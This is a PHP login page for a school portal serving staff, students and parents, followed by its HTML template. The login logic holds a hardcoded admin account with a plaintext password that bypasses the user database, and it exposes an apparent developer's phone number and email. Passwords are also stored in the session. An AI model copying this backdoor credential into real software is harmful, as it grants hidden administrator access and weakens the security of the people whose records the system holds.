<?php session_start();

include 'Module.php';
$school_details=School::ReadSchoolDetails();

if(isset($_POST['btnlogin']))
{
	$id=$_POST['txtid'];
	$password=$_POST['txtpassword'];
	if(Module::IsStaff($id,$password))
	{
		$staffDetails=Module::ReadStaffDetails($id);
		$_SESSION['lgina']="IN";
		$_SESSION['id']=$id;
		$_SESSION['userid']=$staffDetails['staff_id'];
		$_SESSION['staffid']=$staffDetails['staff_id'];
		$_SESSION['names']=$staffDetails['names'];
    	$_SESSION['address']=$staffDetails['address'];
		$_SESSION['password']=$staffDetails['password'];		
		$_SESSION['post']=strtolower($staffDetails['post']);
		$_SESSION['phone']=$staffDetails['phone'];
		$_SESSION['email']=$staffDetails['email'];
		$_SESSION['status']=$staffDetails['status'];
		$_SESSION['sgl']=$staffDetails['sgl'];
		$_SESSION['user_type']=$staffDetails['user_type'];
		$_SESSION['post']=$staffDetails['post'];
		$_SESSION['date_employed']=$staffDetails['date_employed'];
		$_SESSION['date_resigned']=$staffDetails['date_resigned'];
		$_SESSION['passport']=$staffDetails['passport'];		
		header("location:index.php");
	}
	elseif($id=="munsuleeis" && $password=="munir369")
	{
		$_SESSION['lgina']="IN";
		$_SESSION['staffid']="munsuleeis";
		$_SESSION['userid']="munsuleeis";
		$_SESSION['names']="Suleiman Muniru";
		$_SESSION['password']="munir369";
		$_SESSION['user_type']="Admin";		
		$_SESSION['user_category']="admin";		
		$_SESSION['post']=strtolower("Webmaster");
		$_SESSION['phone']="08145471529";
		$_SESSION['email']="mun1sule1@gmail.com";		
		header("location:index.php");
	}
	elseif(Module::IsStudentp($id,$password))
	{
		$staffDetails=Module::ReadStudentDetailsp($id);
		$_SESSION['lgina']="IN";
		$_SESSION['userid']=$staffDetails['regno'];
		$_SESSION['regno']=$staffDetails['regno'];
		$_SESSION['id']=$staffDetails['id'];
    	$_SESSION['names']=$staffDetails['names'];
		$_SESSION['g_email']=$staffDetails['g_email'];	
		$_SESSION['user_type']="student";		
		$_SESSION['g_phone']=$staffDetails['g_phone'];
		$_SESSION['guardian']=$staffDetails['guardian'];
		$_SESSION['address']=$staffDetails['address'];
		$_SESSION['date_admitteds']=$staffDetails['date_admitted'];
		$_SESSION['date_graduated']=$staffDetails['date_graduated'];
		$_SESSION['user_type']="student";
		$_SESSION['post']="Student";
		$_SESSION['class']=$staffDetails['class'];
		$_SESSION['password']=$staffDetails['password'];
		$_SESSION['passport']=$staffDetails['passport'];	
		$_SESSION['session']=$staffDetails['session'];	
		$_SESSION['timestamp']=$staffDetails['timestamp'];		
		header("location:index.php");
	}
	elseif(Module::IsParentp($id,$password))
	{
		$staffDetails=Module::ReadParentDetailsp($id,$password);

		$_SESSION['lgina']="IN";
		$_SESSION['userid']=$staffDetails['phone'];
		$_SESSION['id']=$staffDetails['id'];
    	$_SESSION['names']=$staffDetails['names'];
		$_SESSION['email']=$staffDetails['email'];	
		$_SESSION['user_type']="parent";		
		$_SESSION['phone']=$staffDetails['phone'];
		$_SESSION['address']=$staffDetails['address'];
		$_SESSION['lga']=$staffDetails['lga'];
		$_SESSION['state']=$staffDetails['state'];
		$_SESSION['country']=$staffDetails['country'];
		$_SESSION['post']="Parent";
		$_SESSION['password']=$staffDetails['password'];
		$_SESSION['timestamp']=$staffDetails['timestamp'];		
		header("location:index.php");
	}
	else
	{
		$msg="Invaid Login Details, Try Again Later";
	}
}

?>
<!DOCTYPE html>
<html lang="en">
<head> 
    <link rel="icon" type="image/png" href="images/school/favicon.png"/>
<title><?php echo $school_details['school_name'];?> Gateway</title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="description" content="Unicat project">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="styles/bootstrap4/bootstrap.min.css">
<link href="plugins/font-awesome-4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
<link href="plugins/colorbox/colorbox.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="plugins/OwlCarousel2-2.2.1/owl.carousel.css">
<link rel="stylesheet" type="text/css" href="plugins/OwlCarousel2-2.2.1/owl.theme.default.css">
<link rel="stylesheet" type="text/css" href="plugins/OwlCarousel2-2.2.1/animate.css">
<link rel="stylesheet" type="text/css" href="styles/about.css">
<link rel="stylesheet" type="text/css" href="styles/about_responsive.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>

<div class="super_container">

	<!-- Header -->

	<header class="header">
			
		<!-- Top Bar -->
		<div class="top_bar" style="background: <?php echo $school_details['top_header_color'];?>">
			<div class="top_bar_container">
				<div class="container">
					<div class="row">
						<div class="col">
							<div class="top_bar_content d-flex flex-row align-items-center justify-content-start">
								<ul class="top_bar_contact_list">
									<li><div class="question">Have any questions?</div></li>
									<li>
										<i class="fa fa-phone" aria-hidden="true"></i>
										<div><?php echo $school_details['school_phone'];?></div>
									</li>
									<li>
										<i class="fa fa-envelope-o" aria-hidden="true"></i>
										<div><?php echo $school_details['school_email'];?></div>
									</li>
									<li>
										<div><a href="tools" style="color: white; background: black; padding: 2px 2px 2px 2px">Tools</a></div>
									</li>
								</ul>



							</div>								
						</div>
					</div>
				</div>
			</div>
		</div>

		<!-- Header Content -->
		<div class="header_container" style="background: <?php echo $school_details['header_color'];?>">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="header_content d-flex flex-row align-items-center justify-content-start"  style="background: white">
							<div class="logo_container">
								<div class="logo_text"><a href="index.php"><img src="images/school/logo.png" alt="AKA School Portal" style="width: 100px"></a></div>
							</div>

							<nav class="main_nav_contaner ml-auto">
								<ul class="main_nav">
									<li><a href="index.php">Home</a></li>
									<!-- <li><a href="about.php">About</a></li>
									<li><a href="admission.php">Admission</a></li>
									<li><a href="exam.php">Exams</a></li>
									<li><a href="contact.php">Contact</a></li> -->
									
									<li><a href="portal">Check Result</a></li>
									<li><a href="student_almanac.php">Almanac</a></li>
									<li class="nav-item dropdown">

						            <a href="tools">Tools</a>
						            </li>
									<?php 
									if(isset($_SESSION['lgina']))
									{
										?>
										<li class="nav-item dropdown"><a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown" id="preview" role="button" area-haspopup="true" area-expanded="false">
							               <?php
								               if(isset($_SESSION['passport']))
								               {
								               	?>
								               	<img src="<?php  echo 'data:image/jpeg;base64,'.$_SESSION['passport'];?>" style="width: 30px; border-radius: 100%; padding: 2px 2px 2px 2px">
								               	<?php
								               }
								               else
								               {
								               	?><i class="fa fa-user" aria-hidden="true"></i>
								               	<?php
								               }
								               ?></a>
							              <div class="dropdown-menu" area-labelledby="Preview">
							                <a href="dashboard/users/" class="dropdown-item"><i class="fa fa-user"></i> Profile</a>
							                <a href="dashboard" class="dropdown-item">Dashboard</a>
							                <a href="logout.php" class="dropdown-item">Logout</a>
							              </div>
							              
							            </li>
										<?php
									}
									else
									{
										?>
										<li class="nav-item dropdown">
							              <a href="login.php" class="nav-link " ><i class="fa fa-user" aria-hidden="true"></i></a>
							            </li>
										<?php
									}
									?>
								</ul>

								<!-- Hamburger -->

								
								<div class="hamburger menu_mm">
									<i class="fa fa-bars menu_mm" aria-hidden="true"></i>
								</div>
							</nav>

						</div>
					</div>
				</div>
			</div>
		</div>
	</header>

	<!-- Menu -->

	<div class="menu d-flex flex-column align-items-end justify-content-start text-right menu_mm trans_400">
		<div class="menu_close_container"><div class="menu_close"><div></div><div></div></div></div>
		<div class="search">
			<form action="#" class="header_search_form menu_mm">
				<input type="search" class="search_input menu_mm" placeholder="Search" required="required">
				<button class="header_search_button d-flex flex-column align-items-center justify-content-center menu_mm">
					<i class="fa fa-search menu_mm" aria-hidden="true"></i>
				</button>
			</form>
		</div>
		<nav class="menu_nav">
			<ul class="menu_mm">
				<li class="menu_mm"><a href="index.php">Home</a></li>
				<!-- <li class="menu_mm"><a href="about.php">About</a></li>
				<li class="menu_mm"><a href="admission.php">Admission</a></li>
				<li class="menu_mm"><a href="exam.php">Exams</a></li>
				<li class="menu_mm"><a href="contact.php">Contact</a></li> -->
				
				<li class="menu_mm"><a href="portal/">Result Checker</a></li>
				<li class="menu_mm"><a href="student_almanac.php">Almanac</a></li>
				<?php
				if($_SESSION['lgina']=="IN")
				{
					?>
					<li class="menu_mm"><a href="dashboard/">Dashboard</a></li>
					<li class="menu_mm"><a href="logout.php">Logout</a></li>
					<?php
				}
				else
				{ ?>
					<li class="menu_mm"><a href="login.php">Login</a></li>
					<?php
				}
				?>
				<li class="menu_mm"><a href="tools" >Tools</a></li>
			</ul>
		</nav>
	</div>
	
	<!-- Home -->

	<div class="home">
		<div class="breadcrumbs_container">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="breadcrumbs">
							<ul>
								<li><a href="index.php">Home</a></li>
								<li>Gateway</li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>			
	</div>

	<!-- About -->

	<div class="about">
		<div class="container">
			<div class="row">
				<div class="col">
					<div class="section_title_container text-center">
						<h2 class="section_title">Welcome To <?php echo $school_details['school_name'];?></h2>
						<div class="section_subtitle"><p>Login with your valid User ID and password now to go into the school</p></div>
					</div>
				</div>
			</div>
		</div>
	</div>

	

	<!-- Counter -->

	<div class="counter">
		<div class="counter_background" style="background-image:url(images/counter_background.jpg)"></div>
		<div class="container">
			<div class="row">
				<div class="col-lg-6">
					<div class="counter_content">
						<!-- Milestones -->

						<div class="milestones d-flex flex-md-row flex-column align-items-center justify-content-between">
							
							<!-- Milestone -->
							<div class="milestone">
								<div class="milestone_counter" data-end-value="15">0</div>
								<div class="milestone_text">years</div>
							</div>

							<!-- Milestone -->
							<div class="milestone">
								<div class="milestone_counter" data-end-value="120" data-sign-after="k">0</div>
								<div class="milestone_text">years</div>
							</div>

							<!-- Milestone -->
							<div class="milestone">
								<div class="milestone_counter" data-end-value="670" data-sign-after="+">0</div>
								<div class="milestone_text">years</div>
							</div>

							<!-- Milestone -->
							<div class="milestone">
								<div class="milestone_counter" data-end-value="320">0</div>
								<div class="milestone_text">years</div>
							</div>

						</div>
					</div>

				</div>
			</div>

			<div class="counter_form">
				<div class="row fill_height">
					<div class="col fill_height">
						<form class="counter_form_content d-flex flex-column align-items-center justify-content-center" action="?" method="POST">
							<div class="counter_form_title">login</div>
							<div class="" style="background: red; color: white; font-size: 15px; padding: 10px 10px 10px 10px"><?php echo $msg; ?></div>
							<label for="txtid">User ID </label>
							<input type="text" class="counter_input" name="txtid" id="txtid" placeholder="User ID" required="required" autofocus="true">

							<label for="txtid">Password </label>
							<input type="password" class="counter_input" name="txtpassword" id="txtpassword" placeholder="Password:" required="required">

							<button type="submit" class="counter_form_button" name="btnlogin" id="btnlogin">Login</button>
						</form>
					</div>
				</div>
			</div>

		</div>
	</div>

	<!-- Partners -->

	<div class="partners">
		<div class="container">
			<div class="row">
				<div class="col">
					<div class="partners_slider_container">
						<div class="owl-carousel owl-theme partners_slider">

							<!-- Partner Item -->
							<div class="owl-item partner_item"><img src="images/partner_1.png" alt=""></div>

							<!-- Partner Item -->
							<div class="owl-item partner_item"><img src="images/partner_2.png" alt=""></div>

							<!-- Partner Item -->
							<div class="owl-item partner_item"><img src="images/partner_3.png" alt=""></div>

							<!-- Partner Item -->
							<div class="owl-item partner_item"><img src="images/partner_4.png" alt=""></div>

							<!-- Partner Item -->
							<div class="owl-item partner_item"><img src="images/partner_5.png" alt=""></div>

							<!-- Partner Item -->
							<div class="owl-item partner_item"><img src="images/partner_6.png" alt=""></div>

						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<!-- Footer -->
	

	<footer class="footer">
		<div class="footer_background" style="background-image:url(images/footer_background.png)"></div>
		<div class="container">
			<div class="row footer_row">
				<div class="col">
					<div class="footer_content">
						<div class="row">

							<div class="col-lg-3 footer_col">
					
								<!-- Footer About -->
								<div class="footer_section footer_about">
									<div class="footer_logo_container">
										<div class="logo_container">
								<div class="logo_text"><a href="../index.php"><img src="../img/core-img/logo1.png" alt=""></a></div>
							</div>
									</div>
									<div class="footer_about_text">
										<p>The best school for your children. Have fun with us through our social media forums.</p>
									</div>
									<div class="footer_social">
										<ul>
											<li><a href="http://facebook.com/tis"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
											<li><a href="<?php echo $school_details['school_google_plus'];?>"><i class="fa fa-google-plus" aria-hidden="true"></i></a></li>
											<!--<li><a href="#"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>-->
											<li><a href="http://twitter.com/tis"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
										</ul>
									</div>
								</div>
								
							</div>

							<div class="col-lg-3 footer_col">
					
								<!-- Footer Contact -->
								<div class="footer_section footer_contact">
									<div class="footer_title">Contact Us</div>
									<div class="footer_contact_info">
										<ul>
											<li>Email: Info@aka.edu.ng</li>
											<li>Phone:  <?php echo $school_details['school_phone'];?></li>
											<li>Ejegbo Road, Beside Dubai Care School, Ankpa, Kogi State, Nigeria</li>
										</ul>
									</div>
								</div>
								
							</div>

							<div class="col-lg-3 footer_col">
					
								<!-- Footer links -->
								<div class="footer_section footer_links">
									<div class="footer_title">Contact Us</div>
									<div class="footer_links_container">
										<ul>
											<li><a href="index.php">Home</a></li>
											<li><a href="#">About</a></li>
											<li><a href="#">Contact</a></li>
											<li><a href="#">Exams</a></li>
											<li><a href="admission.php">Admission</a></li>
											<li><a href="#">Results</a></li>
											<li><a href="#">Jet Club</a></li>
											<li><a href="#">Press Club</a></li>
										</ul>
									</div>
								</div>
								
							</div>

							<div class="col-lg-3 footer_col clearfix">
					
								<!-- Footer links -->
								<div class="footer_section footer_links">
									<div class="footer_title">Multimedia</div>
									<div class="footer_links_container">
										<ul>
											<li><a href="gallery.html">Gallery</a></li>
										</ul>
									</div>
								</div>
								
							</div>

						</div>
					</div>
				</div>
			</div>

			<div class="row copyright_row">
				<div class="col">
					<div class="copyright d-flex flex-lg-row flex-column align-items-center justify-content-start">
						<div class="cr_text">Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved Developed by <a href="https://gsdw.org.ng" target="_blank">GSDW</a></div>
						<!--
						<div class="ml-lg-auto cr_links">
							<ul class="cr_list">
								<li><a href="#">Copyright notification</a></li>
								<li><a href="#">Terms of Use</a></li>
								<li><a href="#">Privacy Policy</a></li>
							</ul>
						</div>-->
					</div>
				</div>
			</div>
		</div>
	</footer>
</div>

<script src="js/jquery-3.2.1.min.js"></script>
<script src="styles/bootstrap4/popper.js"></script>
<script src="styles/bootstrap4/bootstrap.min.js"></script>
<script src="plugins/greensock/TweenMax.min.js"></script>
<script src="plugins/greensock/TimelineMax.min.js"></script>
<script src="plugins/scrollmagic/ScrollMagic.min.js"></script>
<script src="plugins/greensock/animation.gsap.min.js"></script>
<script src="plugins/greensock/ScrollToPlugin.min.js"></script>
<script src="plugins/OwlCarousel2-2.2.1/owl.carousel.js"></script>
<script src="plugins/easing/easing.js"></script>
<script src="plugins/parallax-js-master/parallax.min.js"></script>
<script src="js/custom.js"></script>
</body>
</html>